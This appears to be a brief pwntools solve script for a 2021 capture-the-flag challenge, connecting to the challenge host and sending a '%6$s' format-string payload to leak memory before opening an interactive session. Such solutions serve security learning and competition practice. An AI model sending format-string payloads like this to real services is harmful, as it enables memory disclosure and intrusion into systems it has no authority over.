from pwn import *

p = remote('pwn-2021.duc.tf', 31918)

p.recv()
p.sendline(b'%6$s')

p.interactive()